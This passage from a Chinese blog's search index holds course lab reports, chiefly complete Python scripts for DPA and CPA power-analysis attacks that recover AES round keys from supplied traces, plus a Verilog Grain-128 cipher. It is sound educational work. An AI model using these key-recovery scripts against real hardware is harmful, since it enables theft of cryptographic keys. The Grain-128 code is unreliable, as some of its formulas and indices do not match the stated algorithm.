转换为矩阵\u003c/h3\u003e\n\u003cp\u003e服务器原有的 Database 的规模为 N，将 Database 转换为边长为 $\\sqrt{N}$ 的矩阵的形式，这样客户端发起的查询只需要 $\\sqrt{N}$ 规模，由于查询被加密，因此服务端无法得知查询的信息，而客户端只能得到查询向量的 1 对应的位置（查询位置）的信息，因此也无法知晓除了查询外的其他信息。\u003c/p\u003e","title":"Simple PIR 算法原理解析"},{"content":" 遇到的问题：一开始编写的攻击脚本运行效率太低。\n解决方法：更换了使用的统计函数，使得运行速度大幅提升。\n实验亮点：\n使用 python 的 matplotlib 库绘制了功耗曲线。 使用数学公式分析了 DPA 方法和 CPA 方法。 对实验代码进行了清晰的说明，并使用 tqdm 库显示了攻击的进度。 实验前置说明 实验给出了三个 npy 文件：\nAES_tracesPart0.npy: 储存了AES加密时的功耗曲线，共1000条曲线，每个曲线有70000个采样点。 AES_textinPart0.npy: 存储了1000个随机的明文，加密的密钥是固定的。 AES_textoutPart0.npy: 存储了1000条加密后的密文。 可以使用 numpy 来读取 npy 文件\n绘制功耗曲线 我们可以使用 python 的 matplotlib 库来绘制功耗曲线：\nimport matplotlib.pyplot as plt import numpy as np num_traces = 10 #绘制前10条功耗曲线 num_points = 70000 #每条曲线70000个采样点 power_traces = np.load(\u0026#39;AES_tracesPart0.npy\u0026#39;) #导入功耗曲线 plt.figure(figsize=(10,5)) colors = plt.cm.viridis(np.linspace(0, 1, num_traces)) for i in range(num_traces): plt.plot(power_traces[i], color=colors[i], alpha=0.7) plt.title(\u0026#39;All Power Consumption Traces\u0026#39;) plt.xlabel(\u0026#39;Sample Points\u0026#39;) plt.ylabel(\u0026#39;Power Consumption\u0026#39;) plt.grid(True) plt.show() 这里我们绘制前10条功耗曲线：\n可以看到功耗曲线有10个尖峰，这表示这AES加密的10轮加密。\n使用DPA方法攻击第一轮轮密钥 关于DPA方法 DPA（Differential Power Analysis，差分功耗分析）是一种侧信道攻击方法，用于分析加密算法在执行过程中泄露的功耗信息，从而推测出加密密钥等敏感信息。\nDPA 原理 功耗模型\n假设设备的功耗 $P$ 可以表示为： $$ P = P_{\\text{data}} + P_{\\text{noise}} $$ 其中：\n$P_{\\text{data}}$：与处理中间数据相关的功耗。 $P_{\\text{noise}}$：环境噪声或设备内部非相关部分的功耗。 分类依据：\n攻击者假设密钥 $K$，通过 S 盒变换计算中间值： $$ V = SBOX(P_{\\text{plaintext}}[i] \\oplus K) $$ 然后根据 $V$ 的最低有效位对功耗曲线分类。\n差分计算：\n对分类后的两组曲线分别计算平均功耗： $$ \\bar{P}1 = \\frac{1}{N_1} \\sum{i \\in \\text{Group1}} P_i, \\quad \\bar{P}0 = \\frac{1}{N_0} \\sum{i \\in \\text{Group0}} P_i $$ 其中 $N_1$ 和 $ N_0 $ 分别是分组中的样本数量。\n差分功耗： 计算两组平均功耗的差值： $$ \\Delta P = \\bar{P}_1 - \\bar{P}_0 $$ 如果猜测的 $K$ 正确，则在特定的时间点 $ t $（例如 S 盒变换时）出现显著的功耗差异。\n关键步骤： 使用 S 盒计算明文和猜测密钥 $ K $ 的中间值。 根据中间值分组，并计算差分功耗。 根据时间窗口内的最大差分功耗，判断最优密钥。 实现DPA方法 import numpy as np from tqdm import tqdm #用于显示进度条 # 读取 AES 的功耗数据和明文数据 traces = np.load(\u0026#39;AES_tracesPart0.npy\u0026#39;) # 1000条功耗曲线，每条有70000个功耗点 plaintexts = np.load(\u0026#39;AES_textinPart0.npy\u0026#39;) # 对应的1000条随机明文 # AES S 盒，用于 SubBytes 操作 SBOX = [ 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16 ] # 恢复整个第一轮的子密钥（16个字节） num_traces, trace_length = traces.shape key_guesses = np.zeros((16, 256)) # 16个字节，每个字节有256个猜测值 best_keys = np.zeros(16, dtype=int) # 用于存储每个字节的最优猜测 # 针对每个字节进行攻击 for target_byte in tqdm(range(16)): for guess in range(256): group1_sum = np.zeros(trace_length) # 假设中间值的某比特为1的功耗和 group2_sum = np.zeros(trace_length) # 假设中间值的某比特为0的功耗和 group1_count = 0 group2_count = 0 for i in range(num_traces): # 输出字节 SubBytes(明文字节 ⊕ 密钥猜测) intermediate_value = SBOX[plaintexts[i][target_byte] ^ guess] # 使用中间值的某一位作为分类标准，使用最低位 if intermediate_value \u0026amp; 1: # 根据中间值最低位分类 group1_sum += traces[i] group1_count += 1 else: group2_sum += traces[i] group2_count += 1 # 计算两组的平均功耗差异 if group1_count \u0026gt; 0 and group2_count \u0026gt; 0: group1_avg = group1_sum / group1_count group2_avg = group2_sum / group2_count power_diff = group1_avg - group2_avg # 在关键的时间窗口（3000到6000之间）寻找最大差异 key_guesses[target_byte][guess] = np.max(np.abs(power_diff[3000:6000])) # 找到每个字节的密钥猜测 best_keys[target_byte] = np.argmax(key_guesses[target_byte]) # 输出整个第一轮的子密钥 print(\u0026#39;Best key guess:\u0026#39;,end=\u0026#39;\u0026#39;) for i in range(16): print(hex(best_keys[i]), end=\u0026#39; \u0026#39;) 对于轮密钥的16个字节，每个字节逐个遍历。 然后经过SBOX得到中间值，根据中间值的最低位对1000条功耗曲线进行分类。 然后计算出两种类型的平均功耗的差值。 在第一轮 Subbytes 的时间窗口（3000-6000）寻找平均功耗的最大差值对应的字节作为猜测的密钥 运行结果 使用CPA方法攻击最后一轮轮密钥 关于CPA方法 **CPA（Correlation Power Analysis，相关功率分析）**攻击是一种侧信道攻击技术，利用硬件设备在执行加密操作时的功耗泄漏来推测加密算法的密钥。侧信道攻击不依赖于直接破解加密算法，而是通过外部信息（如功耗、电磁辐射、执行时间等）来获得密钥信息。\nCPA 原理 功耗模型\n假设设备的功耗 $P$ 与数据 $D$ 具有线性关系： $$ P = \\alpha \\cdot D + \\beta + \\epsilon $$ 其中：\n$\\alpha$ 和 $\\beta$：线性系数。 $\\epsilon$：噪声。 计算中间值： 根据明文和密钥猜测 $K$ 计算中间值： $$ V = SBOX(P_{\\text{plaintext}}[i] \\oplus K) $$ 然后计算中间值的特征（例如汉明重量或比特翻转数）： $$ H(V) = \\text{HW}(V) $$ 其中 $\\text{HW}(V)$ 表示汉明重量。\n相关性分析：\n通过统计分析功耗 $P$ 与特征值 $H(V)$ 的相关性： $$ \\rho(P, H) = \\frac{\\text{cov}(P, H)}{\\sigma_P \\cdot \\sigma_H} $$ 其中：\n$\\text{cov}(P, H)$ 是 $P$ 和 $H$ 的协方差： $$ \\text{cov}(P, H) = \\frac{1}{N} \\sum_{i=1}^N (P_i - \\bar{P})(H_i - \\bar{H}) $$ $\\sigma_P$ 和 $\\sigma_H$ 分别是 $P$ 和 $H$ 的标准差。 最优密钥选择： 遍历所有可能的密钥 $K$，计算其相关性 $\\rho$，取相关性最大的密钥作为猜测结果。\n实现CPA方法 import numpy as np from tqdm import trange sbox = [ # 0 1 2 3 4 5 6 7 8 9 a b c d e f 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, # 0 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, # 1 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, # 2 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, # 3 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, # 4 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, # 5 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, # 6 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, # 7 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, # 8 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, # 9 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, # a 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, # b 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, # c 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, # d 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, # e 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 # f ] inv_sbox = [ 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D ] def aes_internal(inputdata, key): return inv_sbox[inputdata ^ key] HW = [bin(n).count(\u0026#34;1\u0026#34;) for n in range(0, 256)] # 计算汉明重量 def mean(X): # 计算均值 return np.mean(X, axis=0) def std_dev(X, X_bar): # 计算标准差 return np.sqrt(np.sum((X-X_bar)**2, axis=0)) def cov(X, X_bar, Y, Y_bar): # 计算协方差 return np.sum((X-X_bar)*(Y-Y_bar), axis=0) def CPA(trace, textout_array): # CPA攻击 cpa_correlation = [0]*16 bestguess = [0]*16 for byte in trange(16): trace_mean = np.average(trace, axis=0) trace_omega = np.sqrt(np.sum((trace - trace_mean)**2, axis=0)) # 计算标准差 maxcpa = [0]*256 for kguess in range(0, 256): hws = np.array([[HW[aes_internal(textout[byte], kguess)] for textout in textout_array]]).transpose() hws_bar = mean(hws) o_hws = std_dev(hws, hws_bar) correlation = cov(trace, trace_mean, hws, hws_bar) # 计算协方差 cpaoutput = correlation/(o_hws*trace_omega) # 计算相关系数 maxcpa[kguess] = max(abs(cpaoutput)) # 取绝对值最大的相关系数 bestguess[byte] = np.argmax(maxcpa) # 取相关系数最大的猜测值 cpa_correlation[byte] = max(maxcpa) # 取相关系数最大的值 print(\u0026#34;Best Key Guess: \u0026#34;, end=\u0026#34;\u0026#34;) for i in range(16): print(\u0026#34;%02x\u0026#34; % bestguess[i], end=\u0026#34; \u0026#34;) print() print(\u0026#34;相关系数: \u0026#34;, cpa_correlation) if __name__ == \u0026#39;__main__\u0026#39;: trace = np.load(\u0026#34;AES_tracesPart0.npy\u0026#34;) trace_sbox_position = trace[:, 58000:61000] # textin_array=np.load(\u0026#34;AES_textinPart0.npy\u0026#34;) textout_array = np.load(\u0026#34;AES_textoutPart0.npy\u0026#34;) CPA(trace_sbox_position, textout_array) 遍历256个可能的轮密钥的值。 先将遍历的轮密钥的值与输出结果做异或得到中间值，将中间值的汉明重量存储到一个向量中。 然后计算汉明重量的平均值，方差，协方差和相关系数。 找到最大的相关系数对应的值作为猜测结果。 依次遍历16次得到轮密钥的16个字节。 运行结果 最后一轮 Subbytes 的时间窗口设置为 $(58000,61000)$，运行后得到的最后一轮的轮密钥为： 实验总结 通过本次实验，我深刻认识到了侧信道攻击（DPA 和 CPA）的强大威胁，这类攻击利用硬件泄露的信息（如功耗）即可恢复加密密钥，而无需破解算法本身。实验展现了攻击过程中统计分析的重要性，以及在硬件实现中避免信息泄露的紧迫性。这提醒我们，密码系统的设计不仅要注重算法安全性，更要考虑物理层面的防护措施。\n","permalink":"https://smera1d0.github.io/posts/%E5%AF%86%E7%A0%81%E5%B7%A5%E7%A8%8Baes-%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/","summary":"\u003chr\u003e\n\u003cp\u003e\u003cstrong\u003e遇到的问题\u003c/strong\u003e：一开始编写的攻击脚本运行效率太低。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e解决方法\u003c/strong\u003e：更换了使用的统计函数，使得运行速度大幅提升。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e实验亮点：\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e使用 \u003ccode\u003epython\u003c/code\u003e 的 \u003ccode\u003ematplotlib\u003c/code\u003e 库绘制了功耗曲线。\u003c/li\u003e\n\u003cli\u003e使用数学公式分析了 DPA 方法和 CPA 方法。\u003c/li\u003e\n\u003cli\u003e对实验代码进行了清晰的说明，并使用 tqdm 库显示了攻击的进度。\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"实验前置说明\"\u003e实验前置说明\u003c/h2\u003e\n\u003cp\u003e实验给出了三个 \u003ccode\u003enpy\u003c/code\u003e 文件：\u003c/p\u003e","title":"【密码工程】AES 侧信道攻击"},{"content":"遇到的问题：verilog 语言在设计循环时不能采用类似 C 语言中的 for 循环的设计思想\n解决方法：通过设置计数器和标志位来解决，当计数器到达设定的值时，改变标志位，检测到标志位改变时，退出循环。\n实验报告亮点：在波形图中直观地展示出 Grain128 算法初始化和输出的过程，同时设计了很多标志位，来记录每个阶段的结束过程。\n实验环境 Ubuntu 22.04.4 LTS (wsl2) iverilog 11.0 (stable) GTKWave Analyzer v3.3.104 vscode 算法原理 Grain算法是一种基于寄存器的流密码算法，其设计思路主要包括三个部分：序列产生、密钥更新和密钥生成。在序列产生过程中，通过线性反馈移位寄存器（LFSR）和非线性反馈移位寄存器（NFSR）产生伪随机序列。密钥更新过程使用非线性函数对寄存器中的数据进行变换和混合。密钥生成过程使用产生的伪随机序列与明文进行异或运算，得到密文。\n算法流程 其中，$f(x)$，$g(x)$，$h(x)$，如下所示：\n线性反馈移位寄存器(LFSR)的反馈多项式$f(x)$ $$ f(x) = 1 + x^{32} + x^{47} + x^{58} + x^{90} + x^{121} + x^{128} $$\n非线性反馈移位寄存器 (NFSR) 的反馈多项式 $g(x)$ $$ g(x) = 1 + x^{32} + x^{37} + x^{72} + x^{102} + x^{128} + x^{44}x^{60} + x^{61}x^{125} + x^{63}x^{67} + x^{69}x^{101} + x^{80}x^{88} + x^{110}x^{111} + x^{115}x^{117} $$\n布尔函数 $h(x)$ $$ h(x) = x_0x_1 + x_2x_3 + x_4x_5 + x_6x_7 + x_0x_4x_8 $$\n输出$z_i$ $$ z_i = \\sum_{j \\in A} b_{i+j} + h(x) + s_{i+93}\\ 其中~A = {2, 15, 36, 45, 64, 73, 89} $$\n1. 密钥key和IV初始化 LFSR的前96位装载IV的96位，剩余的32位填充为1。 NFSR装载128位的密钥。 密钥和IV加载后，密码运行256次时钟周期，但不生成密钥流，而是反馈输出并与LFSR和NFSR的输入异或。 2. 移位寄存器的更新 LFSR使用一个128阶的原始多项式进行更新，确保密钥流的统计性质良好，并提供较长的周期。 NFSR通过一个非线性反馈函数更新，提供了额外的非线性来增强密码的安全性。 3. 输出函数 输出函数从LFSR和NFSR的多个位中获取输入，并通过布尔函数 $h(x)$ 生成一个输出位。这个输出位与从寄存器中选择的其他位相加，最终生成密钥流。 4. 密钥流生成 在完成初始化后，系统开始正常工作，LFSR和NFSR按固定步数更新，每个时钟周期输出1位密钥流。 算法实现 项目结构 ➜ Grain128 tree . ├── grain128.v ├── grain128.vcd ├── grain128.vvp └── grain128_tb.v grain128.v：Grain128 算法的 Verilog 源代码 grain128_tb.v：测试平台，用于验证算法的设计 grain128.vvp：由 Verilog 编译器生成的仿真可执行文件 grain128.vcd：仿真产生的波形文件，用于分析信号变化 Grain128 算法的verilog实现 Grain128模块声明 module grain128( input wire clk, input wire reset, input wire [127:0] key, input wire [95:0] iv, output reg keystream ); clk：时钟信号，携带时钟脉冲信号来驱动整个电路的同步操作。 reset：复位信号，用于算法的启动。 key：大小为128bit，用于输入算法的密钥。 iv：大小为96bit，用于输入初始向量。 keystream：输出信号，用于输入生成的密钥流。 其他变量说明 reg [127:0] LFSR; //LFSR寄存器 reg [127:0] NFSR; //NFSR寄存器 wire FEEDBACK_LFSR; //存储经过LFSR反馈多项式后的结果 wire FEEDBACK_NFSR; //存储经过NFSR反馈多项式后的结果 reg [7:0] init_counter; //用于算法初始化的计数器 reg [127:0] counter; //记录反馈总次数的计数器 reg init_done; //记录初始化是否完成的标志位 反馈多项式以及输出$z_i$实现 $h(x)$ function h; input [127:0] LFSR,NFSR; begin //h(x)=b12*S8+S13*S12+b95*S42+b60*S79+b12*b95*S94 h = NFSR[12] ^ LFSR[8] ^ (LFSR[13] \u0026amp; LFSR[12]) ^ (NFSR[95] \u0026amp; LFSR[42]) ^ (LFSR[60] \u0026amp; LFSR[79]) ^ (NFSR[12] \u0026amp; NFSR[95] \u0026amp; LFSR[94]); end endfunction $f(x)$ //f(x)=1+x^32+x^47+x^58+x^90+x^121+x^128 assign FEEDBACK_LFSR = LFSR[0] ^ LFSR[32] ^ LFSR[47] ^ LFSR[58] ^ LFSR[90] ^ LFSR[121] ^LFSR[127]; $g(x)$ //g(x)=1+x^32+x^37+x^72+x^102+x^128+x^44x^60+x^61x^125+x^63x^67x^69x^101+x^80x^88+x^110x^111+x^115x^117+x^40x^50x^58x^101+x^103x^104x^106+x^33x^35x^36x^40 assign FEEDBACK_NFSR = NFSR[0] ^ NFSR[32] ^ NFSR[37] ^ NFSR[72] ^ NFSR[102] ^ NFSR[127] ^ (NFSR[44] \u0026amp; NFSR[60]) ^ (NFSR[61] \u0026amp; NFSR[125]) ^ (NFSR[63] \u0026amp; NFSR[67] \u0026amp; NFSR[69] \u0026amp; NFSR[101]) ^ (NFSR[80] \u0026amp; NFSR[88]) ^ (NFSR[110] \u0026amp; NFSR[111]) ^ (NFSR[115] \u0026amp; NFSR[117]) ^ (NFSR[40] \u0026amp; NFSR[50] \u0026amp; NFSR[58] \u0026amp; NFSR[101]) ^ (NFSR[103] \u0026amp; NFSR[104] \u0026amp; NFSR[106]) ^ (NFSR[33] \u0026amp; NFSR[35] \u0026amp; NFSR[36] \u0026amp; NFSR[40]); 输出$z_i$ $$ z_i = \\sum_{j \\in A} b_{i+j} + h(x) + s_{i+93}\\ 其中~A = {2, 15, 36, 45, 64, 73, 89} $$\nwire Output = NFSR[(2+counter)%128] ^ NFSR[(15+counter)%128] ^ NFSR[(36+counter)%128] ^ NFSR[(45+counter)%128] ^ NFSR[(64+counter)%128] ^ NFSR[(73+counter)%128] ^ NFSR[(89+counter)%128] ^ h(LFSR, NFSR) ^ LFSR[(93+counter)%128] 算法流程实现 always @(posedge clk or posedge reset) begin // 参数初始化 if (reset) begin LFSR \u0026lt;= {iv, 32\u0026#39;hFFFF_FFFF}; NFSR \u0026lt;= key; init_counter \u0026lt;= 8\u0026#39;d0; init_done \u0026lt;= 1\u0026#39;b0; counter \u0026lt;= 128\u0026#39;h0; keystream \u0026lt;= 1\u0026#39;b0; end // 256次初始化 else if(!init_done) begin LFSR \u0026lt;= {LFSR[126:0], FEEDBACK_LFSR}; // LFSR移位并引入反馈 NFSR \u0026lt;= {NFSR[126:0], FEEDBACK_NFSR}; // NFSR移位并引入反馈 init_counter \u0026lt;= init_counter + 1; counter \u0026lt;= counter + 1; if (init_counter == 8\u0026#39;d255) begin init_done \u0026lt;= 1\u0026#39;b1; // 当初始化计数器为255时，将init_done设置为1 end end else begin LFSR \u0026lt;= {LFSR[126:0], FEEDBACK_LFSR}; NFSR \u0026lt;= {NFSR[126:0], FEEDBACK_NFSR}; counter \u0026lt;= counter + 1; keystream \u0026lt;= Output; // 生成密钥流 end end 编写testbench module testbench; reg clk; reg reset; reg [127:0] key; reg [95:0] iv; wire keystream; reg [8:0] init_counter; // 扩展为9位计数器以计数256次初始化时钟周期 reg init_done; // 标志位，标识初始化是否完成 grain128 uut( .clk(clk), .reset(reset), .key(key), .iv(iv), .keystream(keystream) ); always #5 clk = ~clk; initial begin // 指定生成的VCD文件 $dumpfile(\u0026#34;grain128.vcd\u0026#34;); // 开始记录波形数据 $dumpvars(0, testbench); clk = 0; reset = 1; init_counter = 0; init_done = 0; key = 128\u0026#39;h0123456789ABCDEF0123456789ABCDEF; iv = 96\u0026#39;hABCDEF0123456789ABCDEF; $display(\u0026#34;Starting Grain128 Testbench\u0026#34;); // 100时间单位时将复位信号置为0 #100 reset = 0; end always @(posedge clk) begin // 当reset解除后，开始计数 if (!reset \u0026amp;\u0026amp; !init_done) begin if (init_counter \u0026lt; 256) begin init_counter \u0026lt;= init_counter + 1; // 初始化阶段递增计数 end else if (init_counter == 256) begin $display(\u0026#34;Initialization complete at time %0t\u0026#34;, $time); init_done \u0026lt;= 1; // 设置标志位，表示初始化完成 end end end always @(posedge clk) begin // 当初始化完成后，开始显示密钥流 if (init_done) begin $display(\u0026#34;Keystream at time %0t: %b\u0026#34;, $time, keystream); end end initial begin // 运行一定时间后结束仿真 #5000; $display(\u0026#34;Grain128 Testbench finished\u0026#34;); $finish; end endmodule 编译运行 使用命令iverilog -o grain128.vvp grain128_tb.v grain128.v编译并生成可执行文件 使用命令vvp -n grain128.vvp来运行可执行文件 使用命令gtkwave grain128.vcd查看生成的波形文件 运行结果 在256轮初始化后，开始输出密钥流，如下图所示：\n波形图 使用 gtkwave 查看生成的波形文件，如下图所示：\nclk为时钟信号，reset为复位信号，当reset为低电平时，移位寄存器开始更新，同时初始化计数器开始计数，当初始化计数器为255时，初始化完成，init_done置为1，如下图：\n此时开始输出密钥流，可以发现与上面的运行结果相吻合。\n总结 我们使用硬件编程语言verilog实现了一个流密码算法——Grain128，并编写了testbench进行了测试，借助工具iverilog和gtkwave，实现了仿真并查看运行时的波形图，Grain128是一个轻量化的硬件高效的流密码算法，具有很低的门数消耗，同时通过LFSR提供的线性随机性和NFSR提供的非线性随机性组合生成密钥流，确保了安全性，同时保持了极小的硬件占用。通过本次实验，我进一步理解了轻量级密码算法在硬件上的实现方式，并对流密码算法有了更加深刻的理解。\n","permalink":"https://smera1d0.github.io/posts/%E5%AF%86%E7%A0%81%E5%B7%A5%E7%A8%8B%E7%A1%AC%E4%BB%B6%E5%AE%9E%E7%8E%B0-grain-128-%E6%B5%81%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95/","summary":"\u003cp\u003e\u003cstrong\u003e遇到的问题\u003c/strong\u003e：verilog 语言在设计循环时不能采用类似 C 语言中的 for 循环的设计思想\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e解决方法\u003c/strong\u003e：通过设置计数器和标志位来解决，当计数器到达设定的值时，改变标志位，检测到标志位改变时，退出循环。\u003c/p\u003e","title":"【密码工程】硬件实现 Grain128 流密码算法"},{"content":"1 实验目的 使用 Classification 中的 generative model 和 logistic regression，解决二分类问题。根据已有数据，判断该人年收入是否大于 50K。\n2 实验环境 操作系统：windows 11 CPU：AMD Ryzen 7 5800H with Radeon Graphics (3.20 GHz) GPU：NVIDIA GeForce GTX 1650 运行环境： Python 3.10.11 pandas 2.1.0 numpy 1.24.2 matplotlib 3.7.1 tqdm 4.66.1 3 数据处理 3.1 数据文件描述 train.csv / test.csv：包含 age, workclass, fnlwgt (总人数), education, education num, marital-status, occupation, relationship, race, sex, capital-gain, capital-loss, hours-per-week, native-country, make over 50K a year or not 这些特征。\nX_train / X_test：包含 106-dim 的特征的数据，是将 train.csv 进行 one-hot Encoding（独热编码）之后的数据，将分类向量转化为了二进制向量。\nY_train：包含 1-dim 标签的数据，1 表示 make over 50K a year，0 表示 not make over 